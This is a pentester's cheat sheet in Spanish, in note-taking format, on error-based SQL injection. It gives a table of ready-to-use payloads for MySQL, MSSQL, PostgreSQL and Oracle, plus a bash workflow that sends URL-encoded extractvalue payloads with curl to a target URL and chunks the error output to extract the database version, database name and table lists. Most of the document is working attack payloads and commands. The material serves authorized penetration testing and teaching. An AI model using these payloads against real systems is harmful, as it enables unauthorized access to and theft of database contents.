---
aliases:
  - Error-Based SQL Injection
  - Error-based SQLi
tags:
  - vuln/sqli
  - technique/execution
  - asset/database
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
kind: SubCheatSheet
linked:
  - '[[SQL Injection (SQLi)]]'
---
# SQLi - Error based

***

## Cheatsheet

| **Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `' AND extractvalue(rand(),concat(0x3a,(SELECT version())))-- -` | Versión MySQL embebida en mensaje XPath error | MySQL <8.0 + errores expuestos. Límite 32 chars output. |
| `' AND updatexml(rand(),concat(0x3a,(SELECT version())),rand())-- -` | Mismo via `UPDATEXML` | Alt cuando `extractvalue` filtrado. |
| `' AND extractvalue(rand(),concat(0x3a,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))-- -` | Lista de tablas en error | MySQL. Chunk si excede 32 chars con `SUBSTRING`. |
| `' AND extractvalue(rand(),concat(0x3a,(SELECT SUBSTRING(group_concat(table_name),1,30) FROM information_schema.tables WHERE table_schema=database())))-- -` | Primeros 30 chars del listado de tablas | Workaround del límite 32. |
| `' AND 1=(SELECT CONVERT(int,(SELECT @@version)))-- -` | Versión MSSQL en error de conversion | MSSQL con errores expuestos. |
| `' AND 1=CAST((SELECT @@version) AS int)-- -` | Mismo via `CAST` | Alt MSSQL. |
| `' AND 1=CAST((SELECT version()) AS numeric)-- -` | Versión PostgreSQL en error | PostgreSQL. |
| `' AND 1=CAST((SELECT string_agg(table_name,',') FROM information_schema.tables) AS numeric)-- -` | Lista tablas PostgreSQL en error | Equivalente group_concat. |
| `' AND 1=UTL_INADDR.get_host_address((SELECT banner FROM v$version WHERE rownum=1))-- -` | Banner Oracle en error DNS | Oracle (privs UTL_INADDR). |
| `' AND 1=(SELECT 1 FROM xmltype(concat('<a>',(SELECT user FROM dual),'</a>')))-- -` | User Oracle en error XML | Oracle alt sin UTL_INADDR. |
^sqli-error

### Workflow

```bash
TARGET="https://target/items?id=1"

# 1. Identificar SGBD por error message
curl -s "$TARGET'" | grep -iE 'mysql|mariadb|mssql|sql server|postgresql|oracle|ora-'

# 2. MySQL — extractvalue chain
PAYLOADS=(
  "' AND extractvalue(rand(),concat(0x3a,(SELECT version())))-- -"
  "' AND extractvalue(rand(),concat(0x3a,(SELECT database())))-- -"
  "' AND extractvalue(rand(),concat(0x3a,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))-- -"
)

for p in "${PAYLOADS[@]}"; do
  ENC=$(python3 -c "import urllib.parse;print(urllib.parse.quote('$p'))")
  echo "=== $p ==="
  curl -s "$TARGET$ENC" | grep -oE "XPATH syntax error:[^<]*"
done

# 3. Chunking — si excede 32 chars
for i in 1 33 65 97; do
  P="' AND extractvalue(rand(),concat(0x3a,SUBSTRING((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),$i,32)))-- -"
  curl -s "$TARGET$(python3 -c "import urllib.parse;print(urllib.parse.quote('$P'))")" | grep -oE "XPATH syntax error:[^<]*"
done
```

___

## Overview

**Error-based SQLi** = forzar al SGBD a arrojar errores verbose que contengan los datos exfiltrados. Vector In-Band alternativo a [[SQLi - Union based]] cuando UNION no es viable (frontend no refleja, columnas no compatibles).

**Pre-requisito crítico:** errores SQL llegan al cliente sin filtrar. Apps con custom error handling = vector muerto.

**Por motor:**
- **MySQL**: `extractvalue`/`updatexml` con XPath syntax (límite 32 chars).
- **MSSQL**: `CONVERT`/`CAST` to int forzando type mismatch.
- **PostgreSQL**: `CAST as numeric` con string.
- **Oracle**: `UTL_INADDR.get_host_address` o `xmltype`.

***
